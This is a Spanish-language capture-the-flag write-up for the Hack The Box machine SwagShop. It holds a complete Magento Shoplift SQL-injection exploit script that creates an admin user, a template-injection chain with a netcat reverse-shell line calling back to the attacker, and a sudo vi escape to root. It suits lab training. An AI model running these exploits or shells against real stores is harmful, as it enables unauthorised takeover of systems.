# Swagshop

![](../../../../~gitbook/image.md)Publicado: 02 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
SwagShop es una máquina Linux de dificultad Easy que presenta una tienda online construida con Magento CMS versión 1.9.0.0. La explotación inicial se realiza a través de una vulnerabilidad de SQL injection (CVE-2015-1397) conocida como "Shoplift" que permite crear un usuario administrador. Una vez autenticados, se aprovecha la funcionalidad de plantillas de Magento para ejecutar código PHP malicioso y obtener una reverse shell. La escalada de privilegios se consigue mediante el abuso de permisos sudo mal configurados que permiten ejecutar vi como root.
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####80 HTTP
http://swagshop.htb/![](../../../../~gitbook/image.md)
####📂 Fuzzing de directorios
Realizamos fuzzing de directorios usando diversas herramientas como dirsearch, gobuster o feroxbuster:Encontramos un recurso que nos podría dar información sobre la versión que se está utilizando.Pero solo da notas de lanzamiento hasta la versión 1.7.0.2, y luego da una url para visitar para notas de lanzamiento de versión posterior, por lo que esto no es útil en este caso, aunque podría tratarse de una versión antigua.http://swagshop.htb/RELEASE_NOTES.txt![](../../../../~gitbook/image.md)
####🎯 Explotación Inicial
💉 SQL Injection - Magento Shoplift (CVE-2015-1397)Existe un exploit para versiones antiguas que nos permite exploitar un SQLi para añadir un usuario administrador en la base de datos de la aplicación:https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py
####🔓 Acceso al Panel de Administración
Ahora, podemos verificar que las credenciales funcionan accediendo al panel de administración de Magento en http://10.10.10.140/index.php/admin y usando las credenciales ypwq:123![](../../../../~gitbook/image.md)Ahora que ya estamos autenticados, existen varias formas de obtener el RCE partiendo de una autenticación como usuario administrador. Una de ellas es usar alguno de los exploits públicos![](../../../../~gitbook/image.md)
####🐸 Froghopper Attack - Template Injection
Otra por ejemplo es usar la técnica froghopper attack que se detalle en este paper:https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopperPara llevar a cabo este ataque, la cadena sería la siguiente:1 - System -> Configuration -> Advanced -> Developer
En template settings habilitamos esta opción (podremos hacerlo ya que somos admin):![](../../../../~gitbook/image.md)2 - Catalog -> Manage categoriesCreamos una nueva categoría y en el selector de archivos vamos a subir un archivo con extensión poc.php.png con el siguiente contenido:![](../../../../~gitbook/image.md)Haciendo hovering sobre el archivo que hemos subido vemos que se ha alojado en la ruta: http://swagshop.htb/media/catalog/category/poc.php.png3 - Newsletter -> TemplateCreamos un nuevo template en el que vamos a referenciar nuestro archivo para abusar de un LFI el archivo al que quieres apuntar, en este caso nos interesa apuntar a la php reverse shell que hemos subido.Guardamos haciendo click en Save Template.Nota: Aquí el problema que se nos plantea en que no sabemos en qué directorio estamos actualmente (/var/www/html/a/b/c etc), por lo que tendremos que ir jugando e ir bajando directorios hasta que lo encontremos.Para ello vamos primero a iniciar un listener con netcat:Para probar la explotación, hacemos uso del botón Save Template, vamos a trás, pinchamos en la plantilla y por útlimo en Preview Template para que se desencadene la llamada:![](../../../../~gitbook/image.md)Y obtenemos la RCE:Obtenemos la primera flag del directorio del usuario haris:
####👑 Escalada a Root

####🔍 Enumeración de Privilegios Sudo
Verificamos si hay algún comando que podamos ejecutar como root sin que se requiera contraseña y vemos que podemos usar vi para leer cualquier archivo que haya en /var/www/html y se está haciendo uso de wildcard, lo cual es peligroso:Por lo que podríamos simplemente leer cualquier archivo que se encuentre en ese directorioY una vez dentro del contexto de vi, ejecutar lo siguiente:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.10.140
PING 10.10.10.140 (10.10.10.140) 56(84) bytes of data.
64 bytes from 10.10.10.140: icmp_seq=1 ttl=63 time=47.9 ms
64 bytes from 10.10.10.140: icmp_seq=2 ttl=63 time=45.2 ms

--- 10.10.10.140 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 45.191/46.569/47.948/1.378 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.76 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯  echo $ports
22,80
```

```

nmap -sC -sV -p$ports 10.10.10.140 -oN services.txt

❯ Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 15:26 CEST
Nmap scan report for 10.10.10.140
Host is up (1.4s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.10.140  swagshop.htb" | sudo tee -a /etc/hosts
```

```
dirsearch -u http://swagshop.htb/ -x 503

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://swagshop.htb/

[17:41:29] Scanning:
[17:41:33] 403 -   277B - /.php
[17:41:33] 403 -   277B - /.php3
[17:41:42] 200 -    37B - /api.php
[17:41:43] 301 -   310B - /app  ->  http://swagshop.htb/app/
[17:41:43] 200 -    2KB - /app/
[17:41:43] 403 -   277B - /app/.htaccess
[17:41:43] 200 -    5KB - /app/etc/config.xml
[17:41:43] 200 -    2KB - /app/etc/local.xml
[17:41:43] 200 -    2KB - /app/etc/local.xml.template
[17:41:43] 200 -    9KB - /app/etc/local.xml.additional
[17:41:46] 200 -   717B - /cron.sh
[17:41:46] 200 -     0B - /cron.php
[17:41:47] 301 -   313B - /errors  ->  http://swagshop.htb/errors/
[17:41:47] 200 -    2KB - /errors/
[17:41:48] 200 -    1KB - /favicon.ico
[17:41:48] 404 -     0B - /get.php
[17:41:49] 200 -   946B - /includes/
[17:41:49] 301 -   315B - /includes  ->  http://swagshop.htb/includes/
[17:41:49] 200 -   16KB - /index.php
[17:41:49] 404 -   14KB - /index.php/login/
[17:41:50] 200 -    44B - /install.php
[17:41:50] 200 -    44B - /install.php?profile=default
[17:41:50] 301 -   309B - /js  ->  http://swagshop.htb/js/
[17:41:50] 404 -    52B - /js/
[17:41:50] 301 -   318B - /js/tiny_mce  ->  http://swagshop.htb/js/tiny_mce/
[17:41:50] 200 -    4KB - /js/tiny_mce/
[17:41:50] 301 -   310B - /lib  ->  http://swagshop.htb/lib/
[17:41:50] 200 -    3KB - /lib/
[17:41:50] 200 -   10KB - /LICENSE.txt
[17:41:51] 301 -   312B - /media  ->  http://swagshop.htb/media/
[17:41:51] 200 -    2KB - /media/
[17:41:53] 200 -   886B - /php.ini.sample
[17:41:54] 301 -   314B - /pkginfo  ->  http://swagshop.htb/pkginfo/
[17:41:56] 403 -   277B - /server-status
[17:41:56] 403 -   277B - /server-status/
[17:41:56] 301 -   312B - /shell  ->  http://swagshop.htb/shell/
[17:41:56] 200 -    2KB - /shell/
[17:41:55] 200 -  571KB - /RELEASE_NOTES.txt
[17:41:57] 301 -   311B - /skin  ->  http://swagshop.htb/skin/
[17:41:59] 301 -   310B - /var  ->  http://swagshop.htb/var/
[17:41:59] 200 -    2KB - /var/
[17:41:59] 200 -   755B - /var/backups/
[17:41:59] 200 -    4KB - /var/cache/
[17:41:59] 200 -    9KB - /var/package/
```

```
gobuster dir -u http://swagshop.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502,503 -x .php,.txt,.xml -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://swagshop.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404,502,503
[+] User Agent:              gobuster/3.6
[+] Extensions:              xml,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 16593]
/media                (Status: 200) [Size: 1917]
/includes             (Status: 200) [Size: 946]
/install.php          (Status: 200) [Size: 44]
/lib                  (Status: 200) [Size: 2877]
/app                  (Status: 200) [Size: 1698]
/api.php              (Status: 200) [Size: 37]
/shell                (Status: 200) [Size: 1547]
/skin                 (Status: 200) [Size: 1331]
/cron.php             (Status: 200) [Size: 0]
/LICENSE.txt          (Status: 200) [Size: 10410]
/var                  (Status: 200) [Size: 2318]
/errors               (Status: 200) [Size: 2149]
```

```
import requests
import base64
import sys

target = sys.argv[1]

if not target.startswith("http"):
target = "http://" + target

if target.endswith("/"):
target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# For demo purposes, I use the same attack as is being used in the wild
SQLQUERY="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

# Put the nice readable queries into one line,
# and insert the username:password combinination
query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
"filter": base64.b64encode(pfilter),
"forwarded": 1})
if r.ok:
print "WORKED"
print "Check {0}/admin with creds ypwq:123".format(target)
else:
print "DID NOT WORK"
```

```
python2.7 exploit.py 10.10.10.140
WORKED
Check http://10.10.10.140/admin with creds ypwq:123
```

```
&1|nc 10.10.14.3 443 >/tmp/f");
?>
```

```
{{block type="core/template" template="/media/catalog/category/poc.php.png"}}
```

```
nc -nlvp 443
```

```
{{block type="core/template" template="../../../../../../media/catalog/category/shell.php.png""}}
```

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.140] 45992
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

```
www-data@swagshop:/home/haris$ ls -la
total 36
drwxr-xr-x 4 haris haris 4096 Oct 16  2023 .
drwxr-xr-x 3 root  root  4096 Nov 12  2021 ..
-rw------- 1 haris haris   54 May  2  2019 .Xauthority
lrwxrwxrwx 1 root  root     9 May  8  2019 .bash_history -> /dev/null
-rw-r--r-- 1 haris haris  220 May  2  2019 .bash_logout
-rw-r--r-- 1 haris haris 3771 May  2  2019 .bashrc
drwx------ 2 haris haris 4096 Nov 12  2021 .cache
drwx------ 3 haris haris 4096 Oct 13  2023 .gnupg
lrwxrwxrwx 1 root  root     9 Oct 10  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 haris haris  655 May  2  2019 .profile
-rw-r--r-- 1 haris haris   33 May 31 19:47 user.txt
www-data@swagshop:/home/haris$ cat user.txt
```

```
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
(root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/var/www/html$
```

```
sudo /usr/bin/vi /var/www/html/LICENSE.txt
```

```
:!/bin/sh
```
